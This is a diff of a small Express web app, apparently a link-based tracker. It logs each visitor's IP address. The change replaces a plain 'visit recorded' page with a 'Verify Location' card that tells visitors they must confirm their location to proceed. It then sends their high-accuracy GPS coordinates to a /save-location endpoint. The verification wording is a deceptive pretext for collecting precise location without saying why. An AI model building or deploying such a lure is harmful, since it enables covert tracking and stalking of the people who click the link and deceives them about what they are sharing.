@@ -4,10 +4,10 @@ const PORT = process.env.PORT || 3000;
 
 app.set('trust proxy', true);
 
-// Parse JSON request bodies sent from the frontend
+// Parse JSON request bodies
 app.use(express.json());
 
-// Main page route: serves HTML and client-side JavaScript
+// Main page route
 app.get('/', (req, res) => {
     const userIp = req.headers['x-forwarded-for'] 
         ? req.headers['x-forwarded-for'].split(',')[0].trim() 
@@ -17,38 +17,92 @@ app.get('/', (req, res) => {
 
     res.send(`
         <!DOCTYPE html>
-        <html>
+        <html lang="en">
         <head>
-            <title>Visit Recorded</title>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Verify Location</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    margin: 0;
+                    background-color: #f4f4f9;
+                }
+                .card {
+                    background: white;
+                    padding: 30px;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+                    text-align: center;
+                    max-width: 400px;
+                }
+                button {
+                    background-color: #007bff;
+                    color: white;
+                    border: none;
+                    padding: 12px 20px;
+                    font-size: 16px;
+                    border-radius: 5px;
+                    cursor: pointer;
+                    margin-top: 15px;
+                }
+                button:hover {
+                    background-color: #0056b3;
+                }
+                #status {
+                    margin-top: 15px;
+                    color: #555;
+                }
+            </style>
         </head>
         <body>
-            <h1>Thank you for clicking!</h1>
-            <p>Your visit has been successfully recorded.</p>
+            <div class="card">
+                <h1>Welcome!</h1>
+                <p>Please confirm your location to proceed with your visit.</p>
+                <button id="locBtn">Verify My Location</button>
+                <p id="status"></p>
+            </div>
 
             <script>
-                // Request precise geolocation from the browser
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const data = {
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy + " meters"
-                            };
+                const btn = document.getElementById('locBtn');
+                const status = document.getElementById('status');
 
-                            // Send exact coordinates to the server
-                            fetch('/save-location', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(data)
-                            });
-                        },
-                        (error) => {
-                            console.log("Geolocation error or permission denied: " + error.message);
-                        },
-                        { enableHighAccuracy: true, timeout: 10000 }
-                    );
-                }
+                btn.addEventListener('click', () => {
+                    if ("geolocation" in navigator) {
+                        status.textContent = "Requesting location permission...";
+                        
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                status.textContent = "Location verified! Thank you.";
+                                btn.style.display = "none";
+
+                                const data = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy + " meters"
+                                };
+
+                                // Send exact coordinates to the server
+                                fetch('/save-location', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify(data)
+                                });
+                            },
+                            (error) => {
+                                status.textContent = "Unable to retrieve location. Permission was denied or timed out.";
+                                console.log("Geolocation error: " + error.message);
+                            },
+                            { enableHighAccuracy: true, timeout: 10000 }
+                        );
+                    } else {
+                        status.textContent = "Geolocation is not supported by your browser.";
+                    }
+                });
             </script>
         </body>
         </html>
